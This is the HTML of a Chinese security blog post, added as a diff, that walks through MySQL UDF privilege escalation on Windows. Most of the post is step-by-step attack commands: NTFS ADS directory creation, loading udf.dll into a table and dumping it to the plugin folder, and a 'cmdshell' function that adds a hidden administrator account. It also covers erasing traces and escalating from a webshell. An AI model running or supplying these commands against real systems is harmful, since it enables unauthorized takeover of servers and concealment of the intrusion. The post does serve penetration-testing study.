@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+
+    
+
+    
+    <title>数据库提权(一) mysql UDF 提权 | Hexo</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="渗透,安全" />
+    
+    <meta name="description" content="1. udf（user defined function，用户定义函数）为用户提供了一种高效创建函数的方式。udf设计的初衷是为了给用户提供一个扩展MySQL函数的便利机会，方便用户进行复杂的查询处理，但这也为恶意攻击者通过udf提升权限提供了可能。 不同版本提权 udf.dll 文件存放的目录不一样  Windows2003 操作系统导出 udf.dll 到 C:\windows\ 目录下 在">
+<meta property="og:type" content="article">
+<meta property="og:title" content="数据库提权(一) mysql UDF 提权">
+<meta property="og:url" content="http://yoursite.com/2020/10/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83(%E4%B8%80)%20mysql%20UDF%20%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="1. udf（user defined function，用户定义函数）为用户提供了一种高效创建函数的方式。udf设计的初衷是为了给用户提供一个扩展MySQL函数的便利机会，方便用户进行复杂的查询处理，但这也为恶意攻击者通过udf提升权限提供了可能。 不同版本提权 udf.dll 文件存放的目录不一样  Windows2003 操作系统导出 udf.dll 到 C:\windows\ 目录下 在">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://my.lipeilipei.top/images/2020/20201127211020.png">
+<meta property="article:published_time" content="2020-10-05T04:00:00.000Z">
+<meta property="article:modified_time" content="2020-11-27T13:11:41.405Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://my.lipeilipei.top/images/2020/20201127211020.png">
+    
+
+    
+
+    
+        <link rel="icon" href="/css/images/bitbug_favicon.ico" />
+    
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/libs/titillium-web/styles.css">
+
+    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+<script src="/libs/jquery/3.5.0/jquery.min.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+        <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?8229091b2a281af4b398716fce50a2cb";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+    
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="wrap">
+        <header id="header">
+    <div id="header-outer" class="outer">
+        <div class="container">
+            <div class="container-inner">
+                <div id="header-title">
+                    <h1 class="logo-wrap">
+                        <a href="/" class="logo"></a>
+                    </h1>
+                    
+                </div>
+                <div id="header-inner" class="nav-container">
+                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
+                    <div class="nav-container-inner">
+                        <ul id="main-nav">
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/">Home</a>
+                                </li>
+                            
+                                    <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Web%E5%BC%80%E5%8F%91/">Web开发</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/%E6%B5%8B%E8%AF%95/">测试</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/%E7%88%AC%E8%99%AB/">爬虫</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/%E8%87%AA%E5%8A%A8%E5%8C%96/">自动化</a></li></ul>
+                                
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/about/index.html">About</a>
+                                </li>
+                            
+                        </ul>
+                        <nav id="sub-nav">
+                            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+        <div class="container">
+            <div class="main-body container-inner">
+                <div class="main-body-inner">
+                    <section id="main">
+                        <div class="main-body-header">
+    <h1 class="header">
+    
+    <a class="page-title-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
+    </h1>
+</div>
+
+                        <div class="main-body-content">
+                            <article id="post-数据库提权(一) mysql UDF 提权" class="article article-single article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+        数据库提权(一) mysql UDF 提权
+        </h1>
+    
+
+            </header>
+        
+        
+            <div class="article-meta">
+                
+  <div class="article-date">
+    <i class="fa fa-calendar"></i>
+    <a href="/2020/10/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83(%E4%B8%80)%20mysql%20UDF%20%E6%8F%90%E6%9D%83/" class="article-date">
+       <time datetime="2020-10-05T04:00:00.000Z" itemprop="datePublished">2020-10-05</time>
+    </a>
+  </div>
+
+
+<div class="article-date">
+  <i class="fa fa-calendar-plus-o"></i>
+  <a href="/2020/10/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83(%E4%B8%80)%20mysql%20UDF%20%E6%8F%90%E6%9D%83/" class="article-date">
+     <time datetime="2020-11-27T13:11:41.405Z" itemprop="dateModified">2020-11-27</time>
+  </a>
+</div>
+
+
+                
+
+                
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a>, <a class="tag-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
+    </div>
+
+                
+
+                
+
+            </div>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+            
+
+            
+
+            
+
+            <h2 id="1-udf（user-defined-function，用户定义函数）"><a href="#1-udf（user-defined-function，用户定义函数）" class="headerlink" title="1. udf（user defined function，用户定义函数）"></a>1. udf（user defined function，用户定义函数）</h2><p>为用户提供了一种高效创建函数的方式。udf设计的初衷是为了给用户提供一个扩展MySQL函数的便利机会，方便用户进行复杂的查询处理，但这也为恶意攻击者通过udf提升权限提供了可能。</p>
+<p>不同版本提权 udf.dll 文件存放的目录不一样</p>
+<ul>
+<li>Windows2003 操作系统导出 udf.dll 到 <code>C:\windows\</code> 目录下</li>
+<li>在 MySQL 5.1 版本及以后的环境下，udf 提权时需要将 udf.dll 导出到 mysql 安装目录 <code>\lib\plugin\</code> 目录下。</li>
+</ul>
+<h2 id="2-NTFS-ADS-创建目录"><a href="#2-NTFS-ADS-创建目录" class="headerlink" title="2.NTFS ADS 创建目录"></a>2.NTFS ADS 创建目录</h2><p>在 MySQL5.1 以后的环境下只有将 udf.dll 文件导出到 mysql 安装目录 \lib\plugin\ 目录下才能成功，但是很多时候 mysql 安装目录下并不存在lib目录，mysql 文件操作也并不能直接创建目录，此时需要通过 NTFS ADS 流来创建目录。每个文件数据流的完整格式如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;filename&gt;:&lt;stream name&gt;:&lt;stream type&gt;</span><br></pre></td></tr></table></figure>
+<p>只有一个data流时，stream name通常可以省略。当 stream type为 <code>$INDEX_ALLOCATION</code> 时，表明该该数据流的宿主是文件夹。所以可以通过 mysql 导出数据到 <code>directory_path:: $INDEX_ALLOCATION</code> 文件的方法来创建 directory_path 目录。</p>
+<p>查看 mysql 目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;</span><br></pre></td></tr></table></figure>
+
+<p>利用 NTFS ADS 创建 lib 目录，注意 windows 环境下目录路径需要转义</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;xxx&#39; into outfile &#39;C:\\mysql\\mysql-5.1.40-win32\\lib\::$INDEX_ALLOCATION&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>利用 NTFS ADS 创建 plugin 目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;xxx&#39; into outfile &#39;C:\\mysql\\mysql-5.1.40-win32\\lib\\plugin\::$INDEX_ALLOCATION&#39;;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="UDF-提权步骤"><a href="#UDF-提权步骤" class="headerlink" title="UDF 提权步骤"></a>UDF 提权步骤</h2><h4 id="前提：信息收集"><a href="#前提：信息收集" class="headerlink" title="前提：信息收集"></a>前提：信息收集</h4><p>通过前期信息收集获得系统版本、mysql 版本、mysql 是否允许远程登陆、账号密码数据库名等。根据是否允许远程登陆可以分为以下两种方式来 udf 提权</p>
+<ul>
+<li>远程连接 mysql 提权</li>
+<li>通过 webshell 提权</li>
+</ul>
+<p>还需要用到 udf 提权的文件，下载地址：<a href="https://cloud.189.cn/t/yuyUZj7zUr22" target="_blank" rel="noopener">天翼云盘</a></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201105152032.png" alt=""></p>
+<h4 id="方法一：远程连接-Mysql-提权"><a href="#方法一：远程连接-Mysql-提权" class="headerlink" title="方法一：远程连接 Mysql 提权"></a>方法一：远程连接 Mysql 提权</h4><p>前提是目标主机开启了 MySQL 远程连接，并且通过前期信息收集已经获得 MySQL 数据库连接的用户名和密码信息，通过 udf 手工提权获得操作系统管理员权限。</p>
+<p>在靶机上模拟目标机器开启 mysql 远程连接，依次执行以下五条命令来开启</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入 mysql 库</span></span><br><span class="line"><span class="keyword">use</span> mysql;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 user 表中 root 用户的登陆 host 修改为 %，即任意 IP</span></span><br><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> host = <span class="string">'%'</span> <span class="keyword">where</span> <span class="keyword">user</span> = <span class="string">'root'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询修改结果</span></span><br><span class="line"><span class="keyword">select</span> host,<span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 授权 root 用户远程登陆，@ 前面是用户名，BY 后面是密码，这里用户名密码都是 root</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">'root'</span>@<span class="string">'%'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'root'</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 刷新配置使立即生效</span></span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span>;</span><br></pre></td></tr></table></figure>
+
+<p>1.在攻击机上远程连接 mysql，这里使用 navicat 连接</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201102223958.png" alt=""></p>
+<p>2.创建临时表，用来存放提权的 udf.dll 文件数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE temp_udf(udf BLOB);</span><br></pre></td></tr></table></figure>
+<p>表名为 <code>temp_udf</code>, 表内有一个字段 <code>udf</code></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201102224846.png" alt=""></p>
+<p>3.将 udf.dll 二进制数据插入临时表 temp_udf 中</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">into</span> temp_udf <span class="keyword">values</span> (<span class="keyword">CONVERT</span>($binaryCode,<span class="built_in">CHAR</span>));</span><br></pre></td></tr></table></figure>
+<p>其中 <code>$binaryCode</code> 为已经转换好的 udf.txt 文件中复制的十六进制内容。</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201102225451.png" alt=""></p>
+<p>4.将 udf.dll 从临时表 <code>temp_udf</code> 导出到 mysql 安装目录下的 <code>lib/plugin/udf.dll</code> 文件中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT udf FROM Temp_udf INTO DUMPFILE &quot;C:&#x2F;mysql&#x2F;mysql-5.1.40-win32&#x2F;lib&#x2F;plugin&#x2F;udf.dll&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://my.lipeilipei.top/images/2020/20201102230141.png" alt=""></p>
+<p>5.创建用户自定义函数<code>cmdshell</code>，调用第四步保存在安装目录下的 .dll 文件，通过这个函数来执行系统命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &#39;udf.dll&#39;</span><br></pre></td></tr></table></figure>
+
+<p>6.添加用户并加入到管理员组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select cmdshell(&#39;net user pei 123456 &#x2F;add &amp; net localgroup administrators pei &#x2F;add&#39;)</span><br></pre></td></tr></table></figure>
+<p>用户名 <code>pei</code>, 密码 <code>123456</code></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201102230425.png" alt=""></p>
+<p>7.查看 pei 用户是否加入 administrators 管理员用户组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select cmdshell(&#39;net localgroup administrators&#39;)</span><br></pre></td></tr></table></figure>
+<p>在 sql 执行结果上右键保存到本地的 txt 文件，就能看到命令执行的内容</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201102230835.png" alt=""></p>
+<p>用户 pei 成功添加到管理员组，提权成功</p>
+<p>8.擦除痕迹</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 删除临时表</span><br><span class="line">DROP TABLE temp_udf; </span><br><span class="line"></span><br><span class="line"># 删除创建的自定义函数</span><br><span class="line">drop function cmdshell;</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="方法二：通过-Webshell-提权"><a href="#方法二：通过-Webshell-提权" class="headerlink" title="方法二：通过 Webshell 提权"></a>方法二：通过 Webshell 提权</h4><p>如果已经获取webshell权限，可以上传php脚本，但是目标网站的安全策略设置严谨，无法在 webshell 上直接执行操作系统命令，udf 提权能够将 webshell 权限提升为管理员权限。</p>
+<p>1.通过 webshell 上传 moon.php 文件到网站目录，该文件集成了MySQL udf提权的所有命令，可以实现 udf 半自动提权。</p>
+<p>2.访问 <a href="http://xxx.xx.xx.xx/moon.php，" target="_blank" rel="noopener">http://xxx.xx.xx.xx/moon.php，</a> 使用前面信息收集时候获取到的目标数据库用户名、密码和数据库信息登录进去</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201102220207.png" alt=""></p>
+<p>3.导出 udf.dll，mysql 版本为 5.1.40-community，需要将 udf.dll 导出到 mysql 安装目录</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201102220812.png" alt=""></p>
+<p>4.创建 mysql自定义函数 <code>cmdshell</code></p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201102221510.png" alt=""></p>
+<p>5.执行下面的 sql 语句, 通过上一步创建的 cmdshell 函数执行系统命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select cmdshell(&#39;net user pei 123456 &#x2F;add &amp; net localgroup administrators pei &#x2F;add&#39;)</span><br></pre></td></tr></table></figure>
+<p>添加用户 <code>pei</code> 密码为 <code>123456</code>，并将该用户加入到 administrators 管理员组</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201102221737.png" alt=""></p>
+<p>6.查看系统用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select cmdshell(&#39;net localgroup administrators&#39;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://my.lipeilipei.top/images/2020/20201102222720.png" alt=""></p>
+<p>新建的 pei 用户成功添加到管理员组中，拥有系统管理员权限，提权成功</p>
+<p><img src="http://my.lipeilipei.top/images/2020/20201105154557.png" alt=""></p>
+
+        </div>
+        <footer class="article-footer">
+            
+
+    <div class="bdsharebuttonbox">
+    <a href="#" class="bds_more" data-cmd="more">分享到：</a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间">QQ空间</a>
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博">新浪微博</a>
+    <a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博">腾讯微博</a>
+    <a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网">人人网</a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信">微信</a>
+</div>
+<script>
+window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"16"},"share":{"bdSize":16}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+<style>
+    .bdshare_popup_box {
+        border-radius: 4px;
+        border: #e1e1e1 solid 1px;
+    }
+    .bdshare-button-style0-16 a,
+    .bdshare-button-style0-16 .bds_more {
+        padding-left: 20px;
+        margin: 6px 10px 6px 0;
+    }
+    .bdshare_dialog_list a,
+    .bdshare_popup_list a,
+    .bdshare_popup_bottom a {
+        font-family: 'Microsoft Yahei';
+    }
+    .bdshare_popup_top {
+        display: none;
+    }
+    .bdshare_popup_bottom {
+        height: auto;
+        padding: 5px;
+    }
+</style>
+
+
+
+        </footer>
+    </div>
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "author": {
+            "@type": "Person",
+            "name": "John Doe"
+        },
+        "headline": "数据库提权(一) mysql UDF 提权",
+        "image": "http://yoursite.comhttp://my.lipeilipei.top/images/2020/20201127211020.png",
+        "keywords": "渗透 安全",
+        "genre": "安全",
+        "datePublished": "2020-10-05",
+        "dateCreated": "2020-10-05",
+        "dateModified": "2020-11-27",
+        "url": "http://yoursite.com/2020/10/05/数据库提权(一) mysql UDF 提权/",
+        "description": "1. udf（user defined function，用户定义函数）为用户提供了一种高效创建函数的方式。udf设计的初衷是为了给用户提供一个扩展MySQL函数的便利机会，方便用户进行复杂的查询处理，但这也为恶意攻击者通过udf提升权限提供了可能。
+不同版本提权 udf.dll 文件存放的目录不一样
+
+Windows2003 操作系统导出 udf.dll 到 C:\windows\ 目录下
+在 ",
+        "wordCount": 493
+    }
+</script>
+
+</article>
+
+    <section id="comments">
+    
+    </section>
+
+
+
+                        </div>
+                    </section>
+                    <aside id="sidebar">
+    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
+    <div class="sidebar-top">
+        <p>follow:</p>
+        <ul class="social-links">
+            
+                
+                <li>
+                    <a class="social-tooltip" title="github" href="https://github.com/peilipeili" target="_blank" rel="noopener">
+                        <i class="icon fa fa-github"></i>
+                    </a>
+                </li>
+                
+            
+        </ul>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+        <a href="/2020/10/09/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83(%E4%BA%8C)%20sql%20server%20%E6%8F%90%E6%9D%83/" id="article-nav-newer" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">newer</strong>
+        <p class="article-nav-title">
+        
+            数据库提权(二) sql server 提权
+        
+        </p>
+        <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
+    </a>
+    
+    
+        <a href="/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/" id="article-nav-older" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">older</strong>
+        <p class="article-nav-title">Windows 反弹 shell</p>
+        <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
+        </a>
+    
+</nav>
+
+    
+    <div class="widgets-container">
+        
+            
+                
+    <div class="widget-wrap">
+        <h3 class="widget-title">recents</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/10/09/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83(%E4%BA%8C)%20sql%20server%20%E6%8F%90%E6%9D%83/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://my.lipeilipei.top/images/2020/20201127210949.png)" alt="数据库提权(二) sql server 提权" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
+                            <p class="item-title"><a href="/2020/10/09/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83(%E4%BA%8C)%20sql%20server%20%E6%8F%90%E6%9D%83/" class="title">数据库提权(二) sql server 提权</a></p>
+                            <p class="item-date"><time datetime="2020-10-09T04:00:00.000Z" itemprop="datePublished">2020-10-09</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/10/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83(%E4%B8%80)%20mysql%20UDF%20%E6%8F%90%E6%9D%83/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://my.lipeilipei.top/images/2020/20201127211020.png)" alt="数据库提权(一) mysql UDF 提权" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
+                            <p class="item-title"><a href="/2020/10/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83(%E4%B8%80)%20mysql%20UDF%20%E6%8F%90%E6%9D%83/" class="title">数据库提权(一) mysql UDF 提权</a></p>
+                            <p class="item-date"><time datetime="2020-10-05T04:00:00.000Z" itemprop="datePublished">2020-10-05</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://my.lipeilipei.top/images/2020/20201120123010.png)" alt="Windows 反弹 shell" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
+                            <p class="item-title"><a href="/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/" class="title">Windows 反弹 shell</a></p>
+                            <p class="item-date"><time datetime="2020-10-01T04:00:00.000Z" itemprop="datePublished">2020-10-01</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/09/30/msf+python%E5%85%8D%E6%9D%80360%E7%81%AB%E7%BB%92/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://my.lipeilipei.top/images/2020/msf_logo.jpg)" alt="msf+python免杀360火绒" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
+                            <p class="item-title"><a href="/2020/09/30/msf+python%E5%85%8D%E6%9D%80360%E7%81%AB%E7%BB%92/" class="title">msf+python免杀360火绒</a></p>
+                            <p class="item-date"><time datetime="2020-09-30T04:00:00.000Z" itemprop="datePublished">2020-09-30</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/09/24/%E6%9F%90%E5%8D%9A%E5%BD%A9%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://my.lipeilipei.top/images/2020/20200922131655.png)" alt="某博彩网站渗透实战" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
+                            <p class="item-title"><a href="/2020/09/24/%E6%9F%90%E5%8D%9A%E5%BD%A9%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/" class="title">某博彩网站渗透实战</a></p>
+                            <p class="item-date"><time datetime="2020-09-24T04:00:00.000Z" itemprop="datePublished">2020-09-24</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+            
+        
+    </div>
+</aside>
+
+                </div>
+            </div>
+        </div>
+        <footer id="footer">
+    <div class="container">
+        <div class="container-inner">
+            <a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>
+            <div class="credit">
+                <h1 class="logo-wrap">
+                    <a href="/" class="logo"></a>
+                </h1>
+                <p>&copy; 2020 John Doe</p>
+                
+                <p>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>. Theme by <a href="https://github.com/ppoffice" target="_blank">PPOffice</a></p>
+                
+            </div>
+            <div class="footer-plugins">
+              
+    
+
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+    </div>
+    
+
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+
+    
+    
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+</body>
+</html>
